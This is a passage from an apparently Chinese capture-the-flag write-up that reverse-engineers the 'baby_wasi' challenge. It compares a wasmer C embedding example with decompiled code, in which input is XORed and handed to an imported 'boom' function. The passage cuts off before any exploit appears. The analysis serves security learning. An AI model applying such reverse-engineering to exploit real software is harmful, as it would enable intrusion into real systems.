</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;    </span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&#34;../wasmer.h&#34;    </span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;assert.h&gt;    </span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;    </span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;    </span><span class="cp">
</span><span class="cp"></span>    
<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>    
<span class="kt">int32_t</span> <span class="n">amount</span><span class="p">;</span>    
<span class="kt">int32_t</span> <span class="n">value</span><span class="p">;</span>    
<span class="p">}</span> <span class="n">counter_data</span><span class="p">;</span>    
    
<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>    
<span class="kt">uint8_t</span><span class="o">*</span> <span class="n">bytes</span><span class="p">;</span>    
<span class="kt">long</span> <span class="n">bytes_len</span><span class="p">;</span>    
<span class="p">}</span> <span class="n">wasm_file_t</span><span class="p">;</span>    
    
<span class="n">wasm_file_t</span> <span class="nf">read_wasm_file</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">file_name</span><span class="p">)</span> <span class="p">{</span>    
<span class="n">wasm_file_t</span> <span class="n">wasm_file</span><span class="p">;</span>    
    
<span class="n">FILE</span> <span class="o">*</span><span class="n">file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>    
<span class="n">fseek</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_END</span><span class="p">);</span>    
<span class="n">wasm_file</span><span class="p">.</span><span class="n">bytes_len</span> <span class="o">=</span> <span class="n">ftell</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>    
    
<span class="n">wasm_file</span><span class="p">.</span><span class="n">bytes</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">wasm_file</span><span class="p">.</span><span class="n">bytes_len</span><span class="p">);</span>    
<span class="n">fseek</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>    
<span class="n">fread</span><span class="p">(</span><span class="n">wasm_file</span><span class="p">.</span><span class="n">bytes</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">wasm_file</span><span class="p">.</span><span class="n">bytes_len</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>    
<span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>    
    
<span class="k">return</span> <span class="n">wasm_file</span><span class="p">;</span>    
<span class="p">}</span>    
    
<span class="kt">void</span> <span class="nf">inc_counter</span><span class="p">(</span><span class="n">wasmer_instance_context_t</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>    
<span class="n">counter_data</span><span class="o">*</span> <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="n">counter_data</span><span class="o">*</span><span class="p">)</span><span class="n">wasmer_instance_context_data_get</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>    
<span class="n">data</span><span class="o">-&gt;</span><span class="n">value</span> <span class="o">=</span> <span class="n">data</span><span class="o">-&gt;</span><span class="n">value</span> <span class="o">+</span> <span class="n">data</span><span class="o">-&gt;</span><span class="n">amount</span><span class="p">;</span>    
<span class="p">}</span>    
    
<span class="kt">void</span> <span class="nf">mul_counter</span><span class="p">(</span><span class="n">wasmer_instance_context_t</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>    
<span class="n">counter_data</span><span class="o">*</span> <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="n">counter_data</span><span class="o">*</span><span class="p">)</span><span class="n">wasmer_instance_context_data_get</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>    
<span class="n">data</span><span class="o">-&gt;</span><span class="n">value</span> <span class="o">=</span> <span class="n">data</span><span class="o">-&gt;</span><span class="n">value</span> <span class="o">*</span> <span class="n">data</span><span class="o">-&gt;</span><span class="n">amount</span><span class="p">;</span>    
<span class="p">}</span>    
    
<span class="kt">int32_t</span> <span class="nf">get_counter</span><span class="p">(</span><span class="n">wasmer_instance_context_t</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>    
<span class="n">counter_data</span><span class="o">*</span> <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="n">counter_data</span><span class="o">*</span><span class="p">)</span><span class="n">wasmer_instance_context_data_get</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>    
<span class="k">return</span> <span class="n">data</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">;</span>    
<span class="p">}</span>    
    
<span class="n">counter_data</span> <span class="o">*</span><span class="nf">init_counter</span><span class="p">(</span><span class="kt">int32_t</span> <span class="n">value</span><span class="p">,</span> <span class="kt">int32_t</span> <span class="n">amount</span><span class="p">)</span> <span class="p">{</span>    
<span class="n">counter_data</span><span class="o">*</span> <span class="n">counter</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">counter_data</span><span class="p">));</span>    
<span class="n">counter</span><span class="o">-&gt;</span><span class="n">value</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>    
<span class="n">counter</span><span class="o">-&gt;</span><span class="n">amount</span> <span class="o">=</span> <span class="n">amount</span><span class="p">;</span>    
<span class="k">return</span> <span class="n">counter</span><span class="p">;</span>    
<span class="p">}</span>    
    
<span class="n">wasmer_import_t</span> <span class="nf">create_import</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">module_name</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">import_name</span><span class="p">,</span> <span class="n">wasmer_import_func_t</span> <span class="o">*</span><span class="n">func</span><span class="p">)</span> <span class="p">{</span>    
<span class="n">wasmer_import_t</span> <span class="n">import</span><span class="p">;</span>    
<span class="n">wasmer_byte_array</span> <span class="n">module_name_bytes</span><span class="p">;</span>    
<span class="n">wasmer_byte_array</span> <span class="n">import_name_bytes</span><span class="p">;</span>    
    
<span class="n">module_name_bytes</span><span class="p">.</span><span class="n">bytes</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">module_name</span><span class="p">;</span>    
<span class="n">module_name_bytes</span><span class="p">.</span><span class="n">bytes_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">module_name</span><span class="p">);</span>    
    
<span class="n">import_name_bytes</span><span class="p">.</span><span class="n">bytes</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">import_name</span><span class="p">;</span>    
<span class="n">import_name_bytes</span><span class="p">.</span><span class="n">bytes_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">import_name</span><span class="p">);</span>    
    
<span class="n">import</span><span class="p">.</span><span class="n">module_name</span> <span class="o">=</span> <span class="n">module_name_bytes</span><span class="p">;</span>    
<span class="n">import</span><span class="p">.</span><span class="n">import_name</span> <span class="o">=</span> <span class="n">import_name_bytes</span><span class="p">;</span>    
    
<span class="n">import</span><span class="p">.</span><span class="n">tag</span> <span class="o">=</span> <span class="n">WASM_FUNCTION</span><span class="p">;</span>    
<span class="n">import</span><span class="p">.</span><span class="n">value</span><span class="p">.</span><span class="n">func</span> <span class="o">=</span> <span class="n">func</span><span class="p">;</span>    
    
<span class="k">return</span> <span class="n">import</span><span class="p">;</span>    
<span class="p">}</span>    
    
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>    
<span class="p">{</span>    
<span class="c1">// Prepare Imports    
</span><span class="c1"></span><span class="n">wasmer_value_tag</span> <span class="n">inc_params_sig</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{};</span>    
<span class="n">wasmer_value_tag</span> <span class="n">inc_returns_sig</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{};</span>    
<span class="c1">//把inc_counter函数加载到wasm的env中并命名位inc    
</span><span class="c1"></span><span class="n">wasmer_import_func_t</span> <span class="o">*</span><span class="n">inc_func</span> <span class="o">=</span> <span class="n">wasmer_import_func_new</span><span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">))</span> <span class="n">inc_counter</span><span class="p">,</span> <span class="n">inc_params_sig</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">inc_returns_sig</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>    
<span class="n">wasmer_import_t</span> <span class="n">inc_import</span> <span class="o">=</span> <span class="n">create_import</span><span class="p">(</span><span class="s">&#34;env&#34;</span><span class="p">,</span> <span class="s">&#34;inc&#34;</span><span class="p">,</span> <span class="n">inc_func</span><span class="p">);</span>    
    
<span class="n">wasmer_value_tag</span> <span class="n">mul_params_sig</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{};</span>    
<span class="n">wasmer_value_tag</span> <span class="n">mul_returns_sig</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{};</span>    
<span class="c1">//把mul_counter函数加载到wasm的env中并命名位mul    
</span><span class="c1"></span><span class="n">wasmer_import_func_t</span> <span class="o">*</span><span class="n">mul_func</span> <span class="o">=</span> <span class="n">wasmer_import_func_new</span><span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">))</span> <span class="n">mul_counter</span><span class="p">,</span> <span class="n">mul_params_sig</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">mul_returns_sig</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>    
<span class="n">wasmer_import_t</span> <span class="n">mul_import</span> <span class="o">=</span> <span class="n">create_import</span><span class="p">(</span><span class="s">&#34;env&#34;</span><span class="p">,</span> <span class="s">&#34;mul&#34;</span><span class="p">,</span> <span class="n">mul_func</span><span class="p">);</span>    
    
<span class="n">wasmer_value_tag</span> <span class="n">get_params_sig</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{};</span>    
<span class="n">wasmer_value_tag</span> <span class="n">get_returns_sig</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="n">WASM_I32</span><span class="p">};</span>    
<span class="c1">//把get_counter函数加载到wasm的env中并命名位get    
</span><span class="c1"></span><span class="n">wasmer_import_func_t</span> <span class="o">*</span><span class="n">get_func</span> <span class="o">=</span> <span class="n">wasmer_import_func_new</span><span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">))</span> <span class="n">get_counter</span><span class="p">,</span> <span class="n">get_params_sig</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">get_returns_sig</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>    
<span class="n">wasmer_import_t</span> <span class="n">get_import</span> <span class="o">=</span> <span class="n">create_import</span><span class="p">(</span><span class="s">&#34;env&#34;</span><span class="p">,</span> <span class="s">&#34;get&#34;</span><span class="p">,</span> <span class="n">get_func</span><span class="p">);</span>    
    
<span class="c1">// Read the wasm file    
</span><span class="c1"></span><span class="n">wasm_file_t</span> <span class="n">wasm_file</span> <span class="o">=</span> <span class="n">read_wasm_file</span><span class="p">(</span><span class="s">&#34;inc.wasm&#34;</span><span class="p">);</span>    
    
<span class="c1">// Compile module    
</span><span class="c1"></span>		<span class="n">wasmer_module_t</span> <span class="o">*</span><span class="n">module</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>    
		<span class="n">wasmer_result_t</span> <span class="n">compile_res</span> <span class="o">=</span> <span class="n">wasmer_compile</span><span class="p">(</span><span class="o">&amp;</span><span class="n">module</span><span class="p">,</span> <span class="n">wasm_file</span><span class="p">.</span><span class="n">bytes</span><span class="p">,</span> <span class="n">wasm_file</span><span class="p">.</span><span class="n">bytes_len</span><span class="p">);</span>    
		<span class="n">assert</span><span class="p">(</span><span class="n">compile_res</span> <span class="o">==</span> <span class="n">WASMER_OK</span><span class="p">);</span>    
    
		<span class="c1">// Prepare Import Object    
</span><span class="c1"></span><span class="n">wasmer_import_object_t</span> <span class="o">*</span><span class="n">import_object</span> <span class="o">=</span> <span class="n">wasmer_import_object_new</span><span class="p">();</span>    
    
<span class="c1">// First, we import `inc_counter` and `mul_counter`    
</span><span class="c1"></span><span class="n">wasmer_import_t</span> <span class="n">imports</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="n">inc_import</span><span class="p">,</span> <span class="n">mul_import</span><span class="p">};</span>    
<span class="n">wasmer_result_t</span> <span class="n">extend_res</span> <span class="o">=</span> <span class="n">wasmer_import_object_extend</span><span class="p">(</span><span class="n">import_object</span><span class="p">,</span> <span class="n">imports</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>    
<span class="n">assert</span><span class="p">(</span><span class="n">extend_res</span> <span class="o">==</span> <span class="n">WASMER_OK</span><span class="p">);</span>    
    
<span class="c1">// Now, we&#39;ll import `inc_counter` and `mul_counter`    
</span><span class="c1"></span><span class="n">wasmer_import_t</span> <span class="n">more_imports</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="n">get_import</span><span class="p">};</span>    
<span class="n">wasmer_result_t</span> <span class="n">extend_res2</span> <span class="o">=</span> <span class="n">wasmer_import_object_extend</span><span class="p">(</span><span class="n">import_object</span><span class="p">,</span> <span class="n">more_imports</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>    
<span class="n">assert</span><span class="p">(</span><span class="n">extend_res2</span> <span class="o">==</span> <span class="n">WASMER_OK</span><span class="p">);</span>    
    
<span class="c1">// Same `wasmer_import_object_extend` as the first, doesn&#39;t affect anything    
</span><span class="c1"></span><span class="n">wasmer_result_t</span> <span class="n">extend_res3</span> <span class="o">=</span> <span class="n">wasmer_import_object_extend</span><span class="p">(</span><span class="n">import_object</span><span class="p">,</span> <span class="n">imports</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>    
<span class="n">assert</span><span class="p">(</span><span class="n">extend_res3</span> <span class="o">==</span> <span class="n">WASMER_OK</span><span class="p">);</span>    
    
<span class="c1">// Instantiate instance    
</span><span class="c1"></span><span class="n">printf</span><span class="p">(</span><span class="s">&#34;Instantiating</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>    
<span class="n">wasmer_instance_t</span> <span class="o">*</span><span class="n">instance</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>    
<span class="n">wasmer_result_t</span> <span class="n">instantiate_res</span> <span class="o">=</span> <span class="n">wasmer_module_import_instantiate</span><span class="p">(</span><span class="o">&amp;</span><span class="n">instance</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">import_object</span><span class="p">);</span>    
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Compile result:  %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">instantiate_res</span><span class="p">);</span>    
<span class="n">assert</span><span class="p">(</span><span class="n">instantiate_res</span> <span class="o">==</span> <span class="n">WASMER_OK</span><span class="p">);</span>    
    
<span class="c1">// Init counter    
</span><span class="c1"></span><span class="n">counter_data</span> <span class="o">*</span><span class="n">counter</span> <span class="o">=</span> <span class="n">init_counter</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>    
<span class="n">wasmer_instance_context_data_set</span><span class="p">(</span><span class="n">instance</span><span class="p">,</span> <span class="n">counter</span><span class="p">);</span>    
    
<span class="n">wasmer_value_t</span> <span class="n">result_one</span><span class="p">;</span>    
<span class="n">wasmer_value_t</span> <span class="n">params</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{};</span>    
<span class="n">wasmer_value_t</span> <span class="n">results</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="n">result_one</span><span class="p">};</span>    
    
<span class="c1">// 调用wast的inc_and_get函数    
</span><span class="c1"></span><span class="n">wasmer_result_t</span> <span class="n">call1_result</span> <span class="o">=</span> <span class="n">wasmer_instance_call</span><span class="p">(</span><span class="n">instance</span><span class="p">,</span> <span class="s">&#34;inc_and_get&#34;</span><span class="p">,</span> <span class="n">params</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">results</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>    
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Call result:  %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">call1_result</span><span class="p">);</span>    
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Result: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">results</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">value</span><span class="p">.</span><span class="n">I32</span><span class="p">);</span>    
    
<span class="c1">// 调用wast的mul_and_get函数    
</span><span class="c1"></span><span class="n">wasmer_result_t</span> <span class="n">call2_result</span> <span class="o">=</span> <span class="n">wasmer_instance_call</span><span class="p">(</span><span class="n">instance</span><span class="p">,</span> <span class="s">&#34;mul_and_get&#34;</span><span class="p">,</span> <span class="n">params</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">results</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>    
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Call result:  %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">call2_result</span><span class="p">);</span>    
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Result: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">results</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">value</span><span class="p">.</span><span class="n">I32</span><span class="p">);</span>    
    
<span class="c1">// Clear resources    
</span><span class="c1"></span><span class="n">wasmer_import_func_destroy</span><span class="p">(</span><span class="n">inc_func</span><span class="p">);</span>    
<span class="n">wasmer_import_func_destroy</span><span class="p">(</span><span class="n">mul_func</span><span class="p">);</span>    
<span class="n">wasmer_import_func_destroy</span><span class="p">(</span><span class="n">get_func</span><span class="p">);</span>    
<span class="n">wasmer_instance_destroy</span><span class="p">(</span><span class="n">instance</span><span class="p">);</span>    
<span class="n">free</span><span class="p">(</span><span class="n">counter</span><span class="p">);</span>    
<span class="n">free</span><span class="p">(</span><span class="n">wasm_file</span><span class="p">.</span><span class="n">bytes</span><span class="p">);</span>    
    
<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>    
<span class="p">}</span>    
    
<span class="c1">//inc.wast    
</span><span class="c1"></span><span class="p">(</span><span class="n">module</span>    
<span class="p">(</span><span class="n">func</span> <span class="err">$</span><span class="n">inc</span> <span class="p">(</span><span class="n">import</span> <span class="s">&#34;env&#34;</span> <span class="s">&#34;inc&#34;</span><span class="p">))</span>    
<span class="p">(</span><span class="n">func</span> <span class="err">$</span><span class="n">mul</span> <span class="p">(</span><span class="n">import</span> <span class="s">&#34;env&#34;</span> <span class="s">&#34;mul&#34;</span><span class="p">))</span>    
<span class="p">(</span><span class="n">func</span> <span class="err">$</span><span class="n">get</span> <span class="p">(</span><span class="n">import</span> <span class="s">&#34;env&#34;</span> <span class="s">&#34;get&#34;</span><span class="p">)</span> <span class="p">(</span><span class="n">result</span> <span class="n">i32</span><span class="p">))</span>    
    
<span class="p">(</span><span class="n">func</span> <span class="p">(</span><span class="k">export</span> <span class="s">&#34;inc_and_get&#34;</span><span class="p">)</span> <span class="p">(</span><span class="n">result</span> <span class="n">i32</span><span class="p">)</span>    
  <span class="n">call</span> <span class="err">$</span><span class="n">inc</span>    
  <span class="n">call</span> <span class="err">$</span><span class="n">get</span><span class="p">)</span>    
    
<span class="p">(</span><span class="n">func</span> <span class="p">(</span><span class="k">export</span> <span class="s">&#34;mul_and_get&#34;</span><span class="p">)</span> <span class="p">(</span><span class="n">result</span> <span class="n">i32</span><span class="p">)</span>    
  <span class="n">call</span> <span class="err">$</span><span class="n">mul</span>    
  <span class="n">call</span> <span class="err">$</span><span class="n">get</span><span class="p">))</span>    
</code></pre></td></tr></table>
</div>
</div><p>然后对比着看我们的baby_wasi:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">v73</span> <span class="o">=</span> <span class="n">wasmer_import_func_new</span><span class="p">(</span><span class="n">boom</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v56</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v55</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>    
<span class="n">s</span> <span class="o">=</span> <span class="s">&#34;env&#34;</span><span class="p">;</span>    
<span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v54</span> <span class="o">=</span> <span class="s">&#34;env&#34;</span><span class="p">;</span>    
<span class="n">DWORD2</span><span class="p">(</span><span class="n">v54</span><span class="p">)</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="s">&#34;env&#34;</span><span class="p">);</span>    
<span class="n">v71</span> <span class="o">=</span> <span class="s">&#34;boom&#34;</span><span class="p">;</span>    
<span class="n">v52</span> <span class="o">=</span> <span class="s">&#34;boom&#34;</span><span class="p">;</span>    
<span class="n">LODWORD</span><span class="p">(</span><span class="n">v53</span><span class="p">)</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="s">&#34;boom&#34;</span><span class="p">);</span>    
<span class="n">v47</span> <span class="o">=</span> <span class="n">v54</span><span class="p">;</span>    
<span class="n">v48</span> <span class="o">=</span> <span class="s">&#34;boom&#34;</span><span class="p">;</span>    
<span class="n">v49</span> <span class="o">=</span> <span class="n">v53</span><span class="p">;</span>    
</code></pre></td></tr></table>
</div>
</div><p>可以看到baby_wasi把boom函数导入了wasm的env中，然后来看一下program.wat中相应的部分:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>import <span class="s2">&#34;wasi_unstable&#34;</span> <span class="s2">&#34;fd_prestat_get&#34;</span> <span class="o">(</span>func <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span><span class="nb">type</span> 2<span class="o">)))</span>    
<span class="o">(</span>import <span class="s2">&#34;wasi_unstable&#34;</span> <span class="s2">&#34;fd_prestat_dir_name&#34;</span> <span class="o">(</span>func <span class="o">(</span><span class="p">;</span>1<span class="p">;</span><span class="o">)</span> <span class="o">(</span><span class="nb">type</span> 0<span class="o">)))</span>    
<span class="o">(</span>import <span class="s2">&#34;env&#34;</span> <span class="s2">&#34;boom&#34;</span> <span class="o">(</span>func <span class="o">(</span><span class="p">;</span>2<span class="p">;</span><span class="o">)</span> <span class="o">(</span><span class="nb">type</span> 3<span class="o">)))</span>  //在这里导入了    
<span class="o">(</span>import <span class="s2">&#34;wasi_unstable&#34;</span> <span class="s2">&#34;clock_time_get&#34;</span> <span class="o">(</span>func <span class="o">(</span><span class="p">;</span>3<span class="p">;</span><span class="o">)</span> <span class="o">(</span><span class="nb">type</span> 4<span class="o">)))</span>    
<span class="o">(</span>import <span class="s2">&#34;wasi_unstable&#34;</span> <span class="s2">&#34;proc_exit&#34;</span> <span class="o">(</span>func <span class="o">(</span><span class="p">;</span>4<span class="p">;</span><span class="o">)</span> <span class="o">(</span><span class="nb">type</span> 5<span class="o">)))</span>    
</code></pre></td></tr></table>
</div>
</div><p>在刚才找到的关键代码处:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"> <span class="n">scanf</span><span class="p">(</span><span class="mi">1047u</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>                             <span class="c1">// %64s    
</span><span class="c1"></span><span class="k">while</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">!=</span> <span class="mi">64</span> <span class="p">)</span>    
<span class="p">{</span>    
<span class="n">c</span> <span class="o">=</span> <span class="n">i32_load8_u</span><span class="p">(</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">,</span> <span class="n">v5</span> <span class="o">+</span> <span class="n">v7</span> <span class="o">+</span> <span class="mi">32</span><span class="p">);</span>    
<span class="n">v3</span> <span class="o">=</span> <span class="n">get_lucky</span><span class="p">(</span><span class="n">v5</span> <span class="o">+</span> <span class="n">lucky_num</span><span class="p">);</span>    
<span class="n">i32_store8</span><span class="p">(</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">,</span> <span class="n">v5</span><span class="o">++</span> <span class="o">+</span> <span class="n">v7</span> <span class="o">+</span> <span class="mi">32</span><span class="p">,</span> <span class="n">v3</span> <span class="o">^</span> <span class="n">c</span><span class="p">);</span>    
<span class="p">}</span>    
<span class="n">Z_envZ_boomZ_vii</span><span class="p">(</span><span class="n">v7</span> <span class="o">+</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">64LL</span><span class="p">);</span>  <span class="c1">// 调用boom函数    
</span></code></pre></td></tr></table>
</div>
</div><p><code>Z_envZ_boomZ_vii</code>就是boom函数   <br>
所以在对输入进行异或之后，把异或后的内容的地址作为参数调用了boom函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">boom</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">)</span>    
<span class="p">{</span>    
<span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// ST00_4    
</span><span class="c1"></span><span class="kt">void</span> <span class="o">*</span><span class="n">dest</span><span class="p">;</span> <span class="c1">// ST28_8    
</span><span class="c1"></span><span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// rax    
</span><span class="c1"></span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">v6</span><span class="p">;</span> <span class="c1">// rsi    
</span><span class="c1"></span>    
<span class="n">v3</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>    
